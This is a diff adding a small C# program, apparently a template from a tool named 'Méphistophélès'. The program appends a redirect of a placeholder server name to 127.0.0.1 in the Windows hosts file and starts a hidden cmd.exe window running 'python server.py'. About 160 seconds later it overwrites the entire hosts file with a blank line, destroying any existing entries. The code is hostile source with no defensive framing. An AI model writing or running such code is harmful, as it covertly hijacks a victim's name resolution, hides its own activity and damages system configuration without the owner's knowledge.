@@ -1,0 +1,32 @@
+using System;
+using System.Text;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+
+namespace Méphistophélès.Resources
+{
+    public class Source
+    {
+        public static string server_link = "#server";
+
+        public static void Main()
+        {
+            string server = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+
+            File.AppendAllText(server, "127.0.0.1 "+server_link);
+            Process p = new Process();
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/c \"python server.py\"";
+            p.StartInfo = startInfo;
+            p.Start();
+            Thread.Sleep(160000);
+            StreamWriter writer = new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts");
+            string line = "";
+            writer.WriteLine(line);
+            writer.Close();   
+        }
+    }
+}
